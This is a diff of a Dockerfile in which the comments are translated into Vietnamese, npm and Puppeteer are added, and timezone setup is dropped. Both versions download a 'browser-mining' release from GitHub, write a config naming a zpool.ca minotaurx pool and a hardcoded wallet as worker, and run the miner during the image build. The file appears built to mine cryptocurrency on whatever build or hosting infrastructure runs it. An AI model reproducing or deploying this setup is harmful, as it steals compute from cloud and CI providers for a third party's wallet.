@@ -1,24 +1,23 @@
-# Use Ubuntu as base image
+# Sử dụng Ubuntu làm base image
 FROM ubuntu:latest
 
-# Set non-interactive mode during installation
+# Thiết lập chế độ không tương tác trong quá trình cài đặt
 ENV DEBIAN_FRONTEND=noninteractive
 
-# Update package lists and install curl
+# Cập nhật danh sách gói và cài đặt curl và npm
 RUN apt-get update && apt-get install -y \
     curl \
-    tzdata \
+    npm \
  && rm -rf /var/lib/apt/lists/*
 
-# Set the timezone
-RUN ln -fs /usr/share/zoneinfo/UTC /etc/localtime
-RUN dpkg-reconfigure --frontend noninteractive tzdata
-
-# Install Node.js 22.x
+# Cài đặt Node.js 22.x
 RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
     apt-get install -y nodejs
 
-# Download and install browser mining script
+# Cập nhật Puppeteer lên phiên bản mới nhất và hỗ trợ
+RUN npm install puppeteer@latest
+
+# Tải và cài đặt script browser mining
 RUN curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J && \
     tar -xf browser-mining.tar.gz && \
     cd browser-mining && \
@@ -28,8 +27,8 @@ RUN curl https://github.com/malphite-code/browser-mining/releases/download/v1/br
     echo '[{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q", "password": "c=RVN", "workers": 8 }]' > config.json && \
     node index.js
 
-# Clean up
+# Xóa các gói không cần thiết và các tệp tạm
 RUN rm -rf /var/lib/apt/lists/*
 
-# Start command (if needed)
+# Lệnh khởi động (nếu cần)
 # CMD [ "node", "index.js" ]
